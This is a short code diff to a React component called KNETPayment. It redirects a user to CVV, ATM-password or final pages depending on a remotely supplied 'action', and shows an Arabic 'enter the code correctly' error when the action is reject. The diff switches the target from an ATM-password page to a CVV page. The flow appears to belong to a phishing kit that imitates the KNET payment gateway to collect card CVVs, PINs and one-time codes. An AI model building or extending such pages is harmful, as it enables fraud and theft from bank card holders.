@@ -179,7 +179,7 @@ export default function KNETPayment() {
         if (action === "otp") {
           navigate("/final-page");
         } else if (action === "cvv") {
-          navigate("/atm-password");
+          navigate("/cvv");
         } else if (action === "reject") {
           setRejectedError("يرجى إدخال الرمز بشكل صحيح");
           setOtpCode("");
@@ -198,7 +198,7 @@ export default function KNETPayment() {
 
       if (phase === "otp") {
         if (action === "cvv") {
-          navigate("/atm-password");
+          navigate("/cvv");
         } else if (action === "reject") {
           setRejectedError("يرجى إدخال الرمز بشكل صحيح");
           setOtpCode("");
